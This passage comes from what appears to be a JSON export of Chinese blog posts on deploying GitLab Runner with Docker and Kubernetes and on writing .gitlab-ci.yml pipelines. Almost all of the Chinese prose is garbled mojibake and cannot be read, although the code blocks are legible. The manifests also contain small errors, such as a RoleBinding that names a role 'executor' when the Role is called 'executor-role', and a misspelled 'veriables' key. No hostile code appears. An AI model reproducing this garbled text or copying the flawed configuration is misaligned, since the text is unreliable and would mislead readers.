ä¸­çš„éƒ¨ç½²æ–¹å¼ã€‚å°½ç®¡è¿è¡Œç¯å¢ƒå’Œæ‰§è¡Œç¯å¢ƒå¯ä»¥ç›¸äº’ç‹¬ç«‹ï¼Œä½†ä¸ºäº†æ–¹ä¾¿èµ·è§ï¼Œæˆ‘æ›´æ¨èåœ¨åŒä¸€ä¸ªç¯å¢ƒä¸­è¿è¡Œ runner daemon å’Œ jobs. 2. GitLab Runner éƒ¨ç½²ç®€å•æ¥è®²ï¼ŒGitLab Runner çš„éƒ¨ç½²æ–¹å¼åˆ†ä¸ºä¸¤æ­¥ï¼šè¿è¡Œã€æ³¨å†Œã€‚ 2.1 æ³¨å†Œ runneråœ¨ä¸€ä¸ª runner daemon è¿›ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åŒæ—¶æ³¨å†Œå¹¶è¿è¡Œå¤šä¸ª runnerï¼Œæ¥å¹¶è¡Œå®Œæˆå¤šä¸ªåœºæ™¯ä¸‹çš„ä¸åŒä»»åŠ¡ã€‚æ³¨å†Œçš„æ­¥éª¤åœ¨ä¸åŒå¹³å°ä¸‹å¤§åŒå°å¼‚ï¼šè¿è¡Œ gitlab-runner register å‘½ä»¤ï¼Œä¼šè¾“å‡ºä¸€ä¸ªäº¤äº’ç•Œé¢ï¼Œåœ¨é‡Œé¢ä¾æ¬¡è¾“å…¥ GitLab å®ä¾‹åœ°å€ã€CI Tokenã€Runner æè¿°ã€æ ‡ç­¾åˆ—è¡¨ï¼ˆç”¨äºåŒºåˆ†ä¸åŒç±»å‹çš„ Runnerï¼Œä½¿ä¸åŒé˜¶æ®µçš„ job åœ¨ä¸åŒçš„ Runner ä¸­è¿è¡Œï¼‰ã€æ‰§è¡Œç¯å¢ƒç±»å‹ï¼Œå¦‚æœé€‰æ‹©åŸºäº Docker çš„æ‰§è¡Œç¯å¢ƒï¼Œåˆ™éœ€è¦å†è¾“å…¥ä¸€ä¸ªç¼ºçœçš„ job image.æ³¨å†Œä¹‹åï¼ŒRunner ä¼šå°†é…ç½®å†™å…¥ /etc/gitlab-runner/config.toml æ–‡ä»¶ä¸­ï¼Œå¦‚æœæ–‡ä»¶å†…å®¹ä¸ä¸¢å¤±ï¼Œgitlab-runner ç¨‹åºä¼šè‡ªåŠ¨è¯»å–é…ç½®å†…å®¹å¹¶è¿è¡Œï¼Œæ— éœ€é‡å¤æ³¨å†Œã€‚å½“ç„¶ï¼Œå¦‚æœä½ éœ€è¦ä¸€äº›æ›´é«˜çº§çš„é…ç½®ï¼Œåˆ™å¯ä»¥ç›´æ¥ä¿®æ”¹ config.toml. å…·ä½“çš„é…ç½®å¯ä»¥è§å®˜æ–¹æ–‡æ¡£ã€‚åœ¨é…ç½®æ–‡ä»¶æ›´æ”¹åï¼Œrunner daemon ä¼šè‡ªåŠ¨é‡æ–°åŠ è½½é…ç½®ï¼Œæ— éœ€é‡å¯ã€‚æ­¤å¤–ï¼Œgitlab-runner register éå¸¸é¬¼ç•œçš„ä¸€ç‚¹åœ¨äºï¼Œconfig.toml ä¸­çš„éƒ¨åˆ†é…ç½®å¯ä»¥é€šè¿‡ç¯å¢ƒå˜é‡æ³¨å…¥ï¼Œä¸”æ‰€æœ‰é…ç½®éƒ½å¯ä»¥é€šè¿‡æ³¨å†Œå‘½ä»¤çš„å‚æ•°ä¼ å…¥ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä½ å¸Œæœ›ä¸æ¥è§¦ config.tomlï¼Œåªä½¿ç”¨ä¸€æ¡å‘½ä»¤æ¥é…ç½®å¹¶æ³¨å†Œå•ä¸ª runnerï¼Œgitlab-runner register å‘½ä»¤å®Œå…¨å¯ä»¥æ»¡è¶³ä½ çš„è¦æ±‚ã€‚ğŸŒš 2.2 åœ¨ Docker ç¯å¢ƒä¸­éƒ¨ç½²ä¸€å¥è¯ï¼š12345docker run -d --name gitlab-runner --restart always \\ -v /var/run/docker.sock:/var/run/docker.sock \\ -v /data/gitlab-runner/conf:/etc/gitlab-runner \\ --net=host \\ gitlab/gitlab-runner:latestæ³¨æ„ï¼šæˆ‘ä»¬åœ¨è¿™é‡Œå°† /var/run/docker.sock æŒ‚è½½è¿›äº† gitlab-runner å®¹å™¨ï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬å°† Docker ç¯å¢ƒçš„æ§åˆ¶æƒäº¤ç»™äº† runner daemonï¼Œè¿™æ · runner daemon å¯ä»¥åœ¨æ”¶åˆ°ä»»åŠ¡æŒ‡ä»¤æ—¶ï¼Œä½¿ç”¨å½“å‰ Docker ç¯å¢ƒä½œä¸ºæ‰§è¡Œç¯å¢ƒï¼Œåœ¨é‡Œé¢è¿è¡Œå®¹å™¨ä»¥æ‰§è¡Œä»»åŠ¡ã€‚å½“ç„¶ï¼Œè¿™æ ·æŒ‚è½½æ˜¯ä¸€ç§ç›¸å½“å±é™©çš„åšæ³•ã€‚å¦‚æœä½ æ¯”è¾ƒæ‹…å¿ƒå®‰å…¨é—®é¢˜ï¼Œå¯ä»¥è€ƒè™‘åšä¸€ä¸ª docker composeï¼Œå¹¶åœ¨é‡Œé¢è¿è¡Œä¸€ä¸ª dind ï¼ˆDocker in Dockerï¼‰æ¥ä½œä¸º Runner çš„æ‰§è¡Œç¯å¢ƒã€‚ 2.3 åœ¨ Kubernetes ç¯å¢ƒä¸­éƒ¨ç½²åœ¨ k8s ç¯å¢ƒä¸­çš„éƒ¨ç½²è¦ç¨å¾®å¤æ‚ä¸€äº›ï¼ˆå› ä¸ºé…ç½®æ–‡ä»¶å¤ªé•¿ğŸ˜‚ï¼‰ï¼Œå¤§ä½“éœ€è¦é…ç½®ä»¥ä¸‹äº”éƒ¨åˆ†ï¼šä¸€ä¸ªæˆ–è€…ä¸¤ä¸ª Namespaceï¼ˆå–å†³äºä½ æ˜¯å¦è¦æŠŠ job pod å’Œ daemon æ”¾åœ¨åŒä¸€ä¸ª namespace é‡Œï¼‰ä¸€ä¸ª ConfigMapï¼Œç”¨äºæ³¨å…¥ runner é…ç½®ä¸€ä¸ª Deploymentï¼Œç”¨äºè¿è¡Œ runner daemonä¸€ä¸ª ServiceAccountï¼Œç”¨äºç»™ daemon ä½¿ç”¨ï¼Œæ¥å¯åŠ¨ podï¼Œä¸ºè¿è¡Œä»»åŠ¡æä¾›ç¯å¢ƒï¼ˆå½“ç„¶ï¼Œç”¨ defaultï¼‰ä¹Ÿä¸æ˜¯ä¸å¯ä»¥ä¸€ä¸ª Role + RoleBindingï¼Œä¸ºä¸Šé¢çš„ ServiceAccount èµ‹äºˆ pods å’Œ pods/exec æƒé™runner çš„é…ç½®æ³¨å…¥æœ‰ä¸¤ç§æ–¹å¼ï¼šå…ˆåœ¨ GitLab ä¸­æ³¨å†Œå¥½ runnerï¼Œç„¶ååœ¨ ConfigMap ä¸­å†™å¥½é…ç½®æ–‡ä»¶ï¼Œå¹¶åœ¨ Deployment ä¸­ä½œä¸ºä¸€ä¸ª Volume æŒ‚è½½åˆ°é…ç½®ç›®å½•ä¸‹ã€‚è¿™æ˜¯å®˜æ–¹æ–‡æ¡£ä¸­æ¨èçš„åšæ³•ï¼›åœ¨ ConfigMap ä¸­å®šä¹‰ç¯å¢ƒå˜é‡ï¼Œå¹¶åœ¨ pod template çš„ envFrom å±æ€§ä¸­å®šä¹‰ä¸€ä¸ª configMapRef æ¥æ³¨å…¥ç¯å¢ƒå˜é‡ï¼Œå¹¶åœ¨ pod å¯åŠ¨æ—¶å½“åœºæ³¨å†Œä¸€ä¸ª runnerï¼›åœ¨ pod è¢«åœæ­¢å‰å†è°ƒç”¨å‘½ä»¤å°†è¿™ä¸ª runner æ³¨é”€æ‰ï¼ˆæ¨èï¼Œå¦åˆ™ GitLab åå°ä¼šçœ‹åˆ°å¾ˆå¤šç¦»çº¿çš„ runnerï¼‰ã€‚ç”±äºç¼–è¾‘å™¨çš„é«˜äº®è§„åˆ™é€šå¸¸ä¸ä¼šå¤„ç†ä¸€ä¸ªæ–‡ä»¶é‡Œå‡ºç°ä¸¤ç§ä¸åŒè¯­è¨€çš„æƒ…å†µï¼Œåœ¨ ConfigMap é‡Œå†™ toml ä¼šå¾ˆæŒ£æ‰ï¼Œæ‰€ä»¥æˆ‘ä½¿ç”¨çš„æ˜¯ç¬¬äºŒç§æ³¨å…¥æ–¹å¼ã€‚å®Œæ•´çš„é…ç½®æ–‡ä»¶ï¼š123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150apiVersion: v1kind: Namespacemetadata: name: cicd---apiVersion: v1kind: ServiceAccountmetadata: name: executor namespace: cicdimagePullSecrets:- name: dockersecret---apiVersion: rbac.authorization.k8s.io/v1kind: Rolemetadata: namespace: cicd name: executor-rolerules: # runner è¦æ–°å»º podï¼Œæ‰€ä»¥ä¸ºå®ƒèµ‹äºˆ pod ç›¸å…³çš„æƒé™ - apiGroups: [\"\"] resources: [\"pods\", \"pods/exec\"] verbs: [\"get\", \"list\", \"watch\", \"create\", \"update\", \"patch\", \"delete\"]---apiVersion: rbac.authorization.k8s.io/v1kind: RoleBindingmetadata: namespace: cicd name: executor-rolebindingsubjects:- kind: ServiceAccount name: executor namespace: cicdroleRef: kind: Role name: executor apiGroup: rbac.authorization.k8s.io---apiVersion: v1kind: ConfigMapmetadata: namespace: cicd labels: app: gitlab-deployer name: gitlab-runner-cmdata: # å…·ä½“å¯ç”¨çš„å‚æ•°é…ç½®ä»¥åŠç¯å¢ƒå˜é‡é…ç½®å¯ä»¥è¿è¡Œ gitlab-runner register --help æŸ¥çœ‹ REGISTER_NON_INTERACTIVE: \"true\" REGISTER_LOCKED: \"false\" CI_SERVER_URL: \"https://gitlab.com/ci\" METRICS_SERVER: \"0.0.0.0:9100\" RUNNER_CONCURRENT_BUILDS: \"4\" RUNNER_REQUEST_CONCURRENCY: \"4\" RUNNER_TAG_LIST: \"tag1,tag2\" RUNNER_EXECUTOR: \"kubernetes\" KUBERNETES_NAMESPACE: \"cicd\" KUBERNETES_SERVICE_ACCOUNT: \"executor\" KUBERNETES_CPU_LIMIT: \"100m\" KUBERNETES_MEMORY_LIMIT: \"100Mi\" KUBERNETES_SERVICE_CPU_LIMIT: \"100m\" KUBERNETES_SERVICE_MEMORY_LIMIT: \"100Mi\" KUBERNETES_HELPER_CPU_LIMIT: \"100m\" KUBERNETES_HELPER_MEMORY_LIMIT: \"100Mi\" KUBERNETES_PULL_POLICY: \"if-not-present\" KUBERNETES_TERMINATIONGRACEPERIODSECONDS: \"10\" KUBERNETES_POLL_INTERVAL: \"5\" KUBERNETES_POLL_TIMEOUT: \"360\" KUBERNETES_IMAGE: \"kubectl:1.8.1\"---apiVersion: v1kind: Secretmetadata: name: gitlab-ci-token namespace: cicdtype: Opaquedata: token: aGhoaGhoaGg=---apiVersion: apps/v1beta2kind: Deploymentmetadata: name: runner namespace: cicd labels: app: runnerspec: replicas: 1 selector: matchLabels: app: runner template: metadata: labels: app: runner spec: containers: - name: ci-builder image: gitlab/gitlab-runner:v10.6.0 command: # å‘½ä»¤æœ‰ç‚¹é•¿ï¼Œåšäº†ä»¥ä¸‹å‡ æ­¥ï¼šæ³¨é”€å½“å‰çš„ runner name ä»¥é˜²æ­¢ runner å†²çªï¼›æ³¨å†Œæ–°çš„ runnerï¼›å¯åŠ¨ runner daemon - /bin/bash - -c - \"/usr/bin/gitlab-runner unregister -n $RUNNER_NAME || true; /usr/bin/gitlab-runner register; exec /usr/bin/gitlab-runner run\" imagePullPolicy: IfNotPresent envFrom: # é€šè¿‡ ConfigMap æ³¨å…¥ runner é…ç½® - configMapRef: name: gitlab-runner-cm env: # é€šè¿‡ Secret æ³¨å…¥ä¸ GitLab å®ä¾‹è¿›è¡Œäº¤äº’æ‰€ç”¨çš„ CI Token # runner å‘½ä»¤ä¼šè‡ªåŠ¨ä»ç¯å¢ƒå˜é‡ä¸­è¯»å–è¿™ä¸ª tokenï¼Œç”¨äºæ³¨å†Œ runner - name: CI_SERVER_TOKEN valueFrom: secretKeyRef: name: gitlab-ci-token key: token # åŠ¨æ€æ³¨å…¥ç¯å¢ƒå˜é‡ï¼Œä½¿ç”¨ pod name ä½œä¸º runner name # åˆšæŸ¥äº†ä¸€ä¸‹æ–‡æ¡£ï¼Œå¦‚æœä¸é€šè¿‡ç¯å¢ƒå˜é‡æŒ‡å®š runner name çš„è¯ï¼Œä¼šç”¨å½“å‰ç¯å¢ƒçš„ hostnameï¼Œä¹Ÿå°±æ˜¯ pod name æ¥åš runner name # é‚£å®Œå…¨æ²¡å¿…è¦æŠŠè¿™ä¸ª pod name æ³¨å†Œè¿›å»å˜›â€¦ - name: RUNNER_NAME valueFrom: fieldRef: fieldPath: metadata.name # gitlab-runner è‡ªå¸¦ Prometheus metrics serverï¼Œé€šè¿‡ä¸Šé¢çš„ METRICS_SERVER ç¯å¢ƒå˜é‡é…ç½® # å¼ºçš„ä¸€æ¯”ï¼ ports: - containerPort: 9100 name: http-metrics protocol: TCP resources: limits: cpu: \"100m\" memory: \"100Mi\" requests: cpu: \"100m\" memory: \"100Mi\" lifecycle: # åœ¨ pod åœæ­¢å‰ï¼Œæ³¨é”€è¿™ä¸ª runner preStop: exec: command: - /bin/bash - -c - \"/usr/bin/gitlab-runner unregister -n $RUNNER_NAME\" restartPolicy: Alwaysè¿™é‡Œæ³¨æ„ä¸¤ç‚¹ï¼šKubernetes executor ä¸æ”¯æŒåœ¨è¿è¡Œ job æ˜¯ä½¿ç”¨ service aliasï¼Œæ‰€ä»¥è®¿é—®æœåŠ¡æ—¶éƒ½è¦é€šè¿‡ 127.0.0.1 æ¥è®¿é—®ï¼›ä½ å¯èƒ½æ³¨æ„åˆ°ï¼Œé…ç½®é‡Œå‡ºç°äº†ä¸‰ç§ resource limit é…ç½®ï¼šKUBERNETES_CPU_LIMIT, KUBERNETES_SERVICE_CPU_LIMIT, KUBERNETES_HELPER_CPU_LIMITï¼Œè¿™é‡Œä¸‰ä¸ªé…ç½®å°†åº”ç”¨äº kubernetes job pod ä¸­çš„ä¸‰ç±»å®¹å™¨ï¼Œç¬¬ä¸€ç±»ç”¨äºå®é™…æ‰§è¡Œå‘½ä»¤ï¼Œç¬¬äºŒç±»ï¼ˆservice å®¹å™¨ï¼‰ç”¨äºå¯åŠ¨ job æ‰€éœ€çš„ serviceï¼Œç¬¬ä¸‰ç±»ï¼ˆhelper å®¹å™¨ï¼‰ç”¨äºä»»åŠ¡æ‰§è¡Œä¹‹å‰çš„ä»£ç æ‹‰å–ï¼Œä»¥åŠä»»åŠ¡æ‰§è¡Œä¹‹åæ„å»ºäº§ç‰©ï¼ˆartifactï¼‰çš„ä¸Šä¼ ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡é…ç½®æ¥ä¸ºä¸‰ç§å®¹å™¨èµ‹äºˆä¸åŒçš„èµ„æºé™åˆ¶ã€‚è‡³æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ Docker å’Œ Kubernetes ç¯å¢ƒä¸‹éƒ¨ç½² GitLab Runner.","categories":[{"name":"DevOps","slug":"DevOps","permalink":"https://blog.stdioa.com/categories/DevOps/"}],"tags":[{"name":"DevOps","slug":"DevOps","permalink":"https://blog.stdioa.com/tags/DevOps/"},{"name":"GitLab","slug":"GitLab","permalink":"https://blog.stdioa.com/tags/GitLab/"},{"name":"CI/CD","slug":"CI-CD","permalink":"https://blog.stdioa.com/tags/CI-CD/"}]},{"title":"GitLab CI/CD åŸºç¡€æ•™ç¨‹ï¼ˆä¸€ï¼‰","slug":"gitlab-cicd-fundmental","date":"2018-06-06T07:46:00.000Z","updated":"2018-07-12T00:14:59.213Z","comments":true,"path":"2018/06/gitlab-cicd-fundmental/","link":"","permalink":"https://blog.stdioa.com/2018/06/gitlab-cicd-fundmental/","excerpt":"æœ€è¿‘ç©äº† GitLab CI/CD å¹³å°ï¼Œé€šè¿‡æ­å»ºè¿™ä¸ªå¹³å°ä¹Ÿæ”¶è·äº†ä¸€äº›å…³äº DevOps çš„åŸºæœ¬æŠ€èƒ½ï¼Œæ‰“ç®—é€šè¿‡å‡ ç¯‡æ–‡ç« æ¥è®²è¿°ä¸€ä¸‹ GitLab CI/CD å¹³å°çš„æ„å»ºåŠåº”ç”¨ã€‚æœ¬æ–‡å¯¹ GitLab CI/CD ä»¥åŠ CI/CD æµç¨‹å®šä¹‰æ–‡ä»¶çš„å†™æ³•åšäº†ç®€è¦ä»‹ç»ã€‚","text":"æœ€è¿‘ç©äº† GitLab CI/CD å¹³å°ï¼Œé€šè¿‡æ­å»ºè¿™ä¸ªå¹³å°ä¹Ÿæ”¶è·äº†ä¸€äº›å…³äº DevOps çš„åŸºæœ¬æŠ€èƒ½ï¼Œæ‰“ç®—é€šè¿‡å‡ ç¯‡æ–‡ç« æ¥è®²è¿°ä¸€ä¸‹ GitLab CI/CD å¹³å°çš„æ„å»ºåŠåº”ç”¨ã€‚æœ¬æ–‡å¯¹ GitLab CI/CD ä»¥åŠ CI/CD æµç¨‹å®šä¹‰æ–‡ä»¶çš„å†™æ³•åšäº†ç®€è¦ä»‹ç»ã€‚å‰å‡ ä¸ªæœˆå…¬å¸æŠ€æœ¯æ”¹è¿›ï¼ŒæŸäº›ä¸šåŠ¡éƒ¨ç½²åœ¨ k8s é›†ç¾¤ä¸­ï¼Œäºæ˜¯æˆ‘ä»¬å¼€å§‹é€šè¿‡ GitLab è‡ªå¸¦çš„ CI/CD åŠŸèƒ½æ¥å®ç°æœåŠ¡çš„æµ‹è¯•ã€æ„å»ºåŠéƒ¨ç½²ï¼Œæ‰€ä»¥æ‰æœ‰äº†è¿™ç¯‡æ–‡ç« ã€‚ 1. åŸºæœ¬æ¦‚å¿µ 1.1 CI/CDCIï¼ŒContinuous Integrationï¼Œä¸ºæŒç»­é›†æˆã€‚å³åœ¨ä»£ç æ„å»ºè¿‡ç¨‹ä¸­æŒç»­åœ°è¿›è¡Œä»£ç çš„é›†æˆã€æ„å»ºã€ä»¥åŠè‡ªåŠ¨åŒ–æµ‹è¯•ç­‰ï¼›æœ‰äº† CI å·¥å…·ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä»£ç æäº¤çš„è¿‡ç¨‹ä¸­é€šè¿‡å•å…ƒæµ‹è¯•ç­‰å°½æ—©åœ°å‘ç°å¼•å…¥çš„é”™è¯¯ï¼›CDï¼ŒContinuous Deploymentï¼Œä¸ºæŒç»­äº¤ä»˜ã€‚åœ¨ä»£ç æ„å»ºå®Œæ¯•åï¼Œå¯ä»¥æ–¹ä¾¿åœ°å°†æ–°ç‰ˆæœ¬éƒ¨ç½²ä¸Šçº¿ï¼Œè¿™æ ·æœ‰åˆ©äºå¿«é€Ÿè¿­ä»£å¹¶äº¤ä»˜äº§å“ã€‚ 1.2 GitLab CI/CDGitLab CI/CDï¼ˆåç®€ç§° GitLab CIï¼‰æ˜¯ä¸€å¥—åŸºäº GitLab çš„ CI/CD ç³»ç»Ÿï¼Œå¯ä»¥è®©å¼€å‘äººå‘˜é€šè¿‡ .gitlab-ci.yml åœ¨é¡¹ç›®ä¸­é…ç½® CI/CD æµç¨‹ï¼Œåœ¨æäº¤åï¼Œç³»ç»Ÿå¯ä»¥è‡ªåŠ¨/æ‰‹åŠ¨åœ°æ‰§è¡Œä»»åŠ¡ï¼Œå®Œæˆ CI/CD æ“ä½œã€‚è€Œä¸”ï¼Œå®ƒçš„é…ç½®éå¸¸ç®€å•ï¼ŒCI Runner ç”± Go è¯­è¨€ç¼–å†™ï¼Œæœ€ç»ˆæ‰“åŒ…æˆå•æ–‡ä»¶ï¼Œæ‰€ä»¥åªéœ€è¦ä¸€ä¸ª Runner ç¨‹åºã€ä»¥åŠä¸€ä¸ªç”¨äºè¿è¡Œ jobs çš„æ‰§è¡Œå¹³å°ï¼ˆå¦‚è£¸æœº+SSHï¼ŒDocker æˆ– Kubernetes ç­‰ï¼Œæˆ‘æ¨èç”¨ Dockerï¼Œå› ä¸ºæ­å»ºç›¸å½“å®¹æ˜“ï¼‰å³å¯è¿è¡Œä¸€å¥—å®Œæ•´çš„ CI/CD ç³»ç»Ÿã€‚ä¸‹é¢é’ˆå¯¹ Gitlab CI å¹³å°çš„ä¸€äº›åŸºæœ¬æ¦‚å¿µåšä¸€ä¸ªç®€å•ä»‹ç»ï¼šJobJob ä¸ºä»»åŠ¡ï¼Œæ˜¯ GitLab CI ç³»ç»Ÿä¸­å¯ä»¥ç‹¬ç«‹æ§åˆ¶å¹¶è¿è¡Œçš„æœ€å°å•ä½ã€‚åœ¨æäº¤ä»£ç åï¼Œå¼€å‘è€…å¯ä»¥é’ˆå¯¹ç‰¹å®šçš„ commit å®Œæˆä¸€ä¸ªæˆ–å¤šä¸ª jobï¼Œä»è€Œè¿›è¡Œ CI/CD æ“ä½œã€‚PipelinePipeline å³æµæ°´çº¿ï¼Œå¯ä»¥åƒæµæ°´çº¿ä¸€æ ·æ‰§è¡Œå¤šä¸ª Job.åœ¨ä»£ç æäº¤æˆ– MR è¢«åˆå¹¶æ—¶ï¼ŒGitLab å¯ä»¥åœ¨æœ€æ–°ç”Ÿæˆçš„ commit ä¸Šå»ºç«‹ä¸€ä¸ª pipelineï¼Œåœ¨åŒä¸€ä¸ª pipeline ä¸Šäº§ç”Ÿçš„å¤šä¸ªä»»åŠ¡ä¸­ï¼Œæ‰€ç”¨åˆ°çš„ä»£ç ç‰ˆæœ¬æ˜¯ä¸€è‡´çš„ã€‚Stageä¸€èˆ¬çš„æµæ°´çº¿é€šå¸¸ä¼šåˆ†ä¸ºå‡ æ®µï¼›åœ¨ pipeline ä¸­ï¼Œå¯ä»¥å°†å¤šä¸ªä»»åŠ¡åˆ’åˆ†åœ¨å¤šä¸ªé˜¶æ®µä¸­ï¼Œåªæœ‰å½“å‰ä¸€é˜¶æ®µçš„æ‰€æœ‰ä»»åŠ¡éƒ½æ‰§è¡ŒæˆåŠŸåï¼Œä¸‹ä¸€é˜¶æ®µçš„ä»»åŠ¡æ‰å¯è¢«æ‰§è¡Œã€‚æ³¨ï¼šå¦‚æœæŸä¸€é˜¶æ®µçš„ä»»åŠ¡å‡è¢«è®¾å®šä¸ºâ€œå…è®¸å¤±è´¥â€ï¼Œé‚£è¿™ä¸ªé˜¶æ®µçš„ä»»åŠ¡æ‰§è¡Œæƒ…å†µï¼Œä¸ä¼šå½±å“åˆ°ä¸‹ä¸€é˜¶æ®µçš„æ‰§è¡Œã€‚ä¸Šå›¾ä¸­ï¼Œæ•´æ¡æµæ°´çº¿ä»å·¦å‘å³ä¾æ¬¡æ‰§è¡Œï¼Œæ¯ä¸€åˆ—å‡ä¸ºä¸€ä¸ªé˜¶æ®µï¼Œè€Œåˆ—ä¸­çš„æ¯ä¸ªå¯æ“æ§å…ƒç´ å‡ä¸ºä»»åŠ¡ã€‚å·¦è¾¹ä¸¤ä¸ªé˜¶æ®µçš„ä»»åŠ¡æ˜¯è‡ªåŠ¨æ‰§è¡Œçš„ä»»åŠ¡ï¼Œåœ¨ commit æäº¤åå³å¯è‡ªåŠ¨å¼€å§‹è¿è¡Œï¼Œæ‰§è¡ŒæˆåŠŸæˆ–å¤±è´¥åï¼Œå¯ä»¥ç‚¹å‡»ä»»åŠ¡å³è¾¹çš„æŒ‰é’®é‡è¯•ï¼›è€Œå³è¾¹ä¸¤ä¸ªæ˜¯æ‰‹åŠ¨è§¦å‘ä»»åŠ¡ï¼Œéœ€è¦äººå·¥ç‚¹å‡»å³è¾¹çš„â€œæ’­æ”¾â€æŒ‰é’®æ¥æ‰‹åŠ¨è¿è¡Œã€‚ 2. CI/CD æµç¨‹é…ç½® 2.1 å®Œæ•´å®šä¹‰GitLab å…è®¸åœ¨é¡¹ç›®ä¸­ç¼–å†™ .gitlab-ci.yml æ–‡ä»¶ï¼Œæ¥é…ç½® CI/CD æµç¨‹ã€‚ä¸‹é¢ï¼Œæˆ‘ä»¬æ¥ç¼–å†™ä¸€ä¸ªç®€å•çš„æµ‹è¯•â†’æ„å»ºâ†’éƒ¨ç½²çš„ CI/CD æµç¨‹ã€‚é¦–å…ˆï¼Œå¯ä»¥å®šä¹‰æµç¨‹æ‰€åŒ…å«çš„é˜¶æ®µã€‚æˆ‘ä»¬çš„æµç¨‹åŒ…å«ä¸‰ä¸ªé˜¶æ®µï¼šæµ‹è¯•ã€æ„å»ºå’Œéƒ¨ç½²ã€‚åœ¨ .gitlab-ci.yml çš„å¼€å¤´ï¼Œå®šä¹‰å¥½æ‰€æœ‰é˜¶æ®µã€ä»¥åŠæ‰§è¡Œæ¯ä¸ªä»»åŠ¡ä¹‹å‰æ‰€éœ€è¦çš„ç¯å¢ƒå˜é‡ä»¥åŠå‡†å¤‡å·¥ä½œï¼Œç„¶åå®šä¹‰æ•´ä¸ªæµç¨‹ä¸­åŒ…å«çš„æ‰€æœ‰ä»»åŠ¡ï¼š1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253stages: - test - build - deployvariables: IMAGE: docker.registry/name/$&#123;CI_PROJECT_NAMESPACE&#125;-$&#123;CI_PROJECT_NAME&#125;before_script: - IMAGE_TAG=$&#123;IMAGE&#125;:$&#123;CI_COMMIT_SHA:0:8&#125;test_all: image: \"pymicro\" stage: test services: - name: mysql:5.6 alias: mysql veriables: MYSQL_DATABASE: db MYSQL_ROOT_PASSWORD: password before_script: - pip install -U -r requirements.txt script: - flake8 app - pytest testsbuild_image: image: \"docker:17.11\" stage: build services: - name: \"docker:17.12.0-ce-dind\" alias: dockerd variables: DOCKER_HOST: tcp://dockerd:2375 only: - master tags: - build script: - docker build -t $&#123;IMAGE_TAG&#125; -f Dockerfile . - docker push $&#123;IMAGE_TAG&#125;deploy_production: stage: deploy variables: GIT_STRATEGY: none only: - master when: manual tags: - deploy-production script: - kubectl set image deploy/myproject \"app=$&#123;IMAGE_TAG&#125;\" --recordåœ¨æ¯ä¸ªä»»åŠ¡ä¸­ï¼Œé€šå¸¸ä¼šåŒ…å« image, stage,services, script ç­‰å­—æ®µã€‚å…¶ä¸­ï¼Œstage å®šä¹‰äº†ä»»åŠ¡æ‰€å±çš„é˜¶æ®µï¼›image å­—æ®µæŒ‡å®šäº†æ‰§è¡Œä»»åŠ¡æ—¶æ‰€éœ€è¦çš„ docker é•œåƒï¼›services æŒ‡å®šäº†æ‰§è¡Œä»»åŠ¡æ—¶æ‰€éœ€çš„ä¾èµ–æœåŠ¡ï¼ˆå¦‚æ•°æ®åº“ã€Docker æœåŠ¡å™¨ç­‰ï¼‰ï¼›è€Œ script ç›´æ¥å®šä¹‰äº†ä»»åŠ¡æ‰€éœ€æ‰§è¡Œçš„å‘½ä»¤ã€‚ä¸‹é¢ç®€å•ä»‹ç»ä¸€ä¸‹æ¯ä¸ªé˜¶æ®µä¸­çš„ä»»åŠ¡ã€‚ 2.2 æµ‹è¯•åœ¨æµ‹è¯•ä»»åŠ¡ä¸­ï¼Œæˆ‘ä»¬å¯åŠ¨äº† MySQL æœåŠ¡ï¼Œå¹¶é€šè¿‡ç¯å¢ƒå˜é‡æ³¨å…¥äº† MySQL çš„åˆå§‹æ•°æ®åº“ä»¥åŠ Root å¯†ç ï¼Œåœ¨æœåŠ¡å¯åŠ¨åï¼ŒRunner ä¼šè¿è¡Œ before_script ä¸­çš„å‘½ä»¤æ¥å®‰è£…æ‰€éœ€ä¾èµ–ï¼›å®‰è£…æˆåŠŸåå°±ä¼šè¿è¡Œ script å±æ€§ä¸­çš„å‘½ä»¤æ¥è¿›è¡Œä»£ç é£æ ¼æ£€æŸ¥ä»¥åŠå•å…ƒæµ‹è¯•ï¼›å¯ä»¥æ³¨æ„åˆ°ï¼Œæˆ‘ä»¬çš„ MySQL æœåŠ¡ä¸‹æœ‰ä¸€ä¸ª alias å±æ€§æ ‡è¯†æœåŠ¡åˆ«åã€‚å¦‚æœä½ çš„ Runner è¿è¡Œåœ¨ Docker å¹³å°ä¸‹ï¼Œä½ å¯ä»¥ç›´æ¥é€šè¿‡æœåŠ¡åˆ«åè®¿é—®åˆ°è¯¥æµ‹è¯•ç¯å¢ƒä¸­å¯¹åº”çš„æœåŠ¡ã€‚æ¯”å¦‚åœ¨è¿™ä¸ªä»»åŠ¡ä¸­ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç”¨ mysql://root:password@mysql/db æ¥è®¿é—®æµ‹è¯•æ•°æ®åº“ã€‚ 2.3 æ„å»ºåœ¨æ„å»ºä»»åŠ¡ä¸­ï¼Œæˆ‘ä»¬ä¼šç”¨ Dockerfile æ³¨å…¥ä¾èµ–ï¼Œå°†å·¥ç¨‹æ‰“åŒ…æˆ Docker é•œåƒå¹¶ä¸Šä¼ ï¼›æˆ‘ä»¬ä¸ºè¿™ä¸ªä»»åŠ¡å®šä¹‰äº†ä¸€äº›é¢å¤–çš„å±æ€§ï¼štag å±æ€§å¯ä»¥æ ‡è®°è¿™ä¸ªä»»åŠ¡å°†åœ¨å«æœ‰ç‰¹å®š tag çš„ CI Runner ä¸Šè¿è¡Œï¼›è€Œ only å±æ€§è¡¨ç¤ºåªæœ‰è¿™ä¸ª commit åœ¨ç‰¹å®šçš„åˆ†æ”¯ä¸‹ï¼ˆå¦‚ masterï¼‰æ—¶ï¼Œæ‰å¯ä»¥åœ¨æ­¤ commit ä¸Šè¿è¡Œè¿™ä¸ªä»»åŠ¡ã€‚only å’Œ except 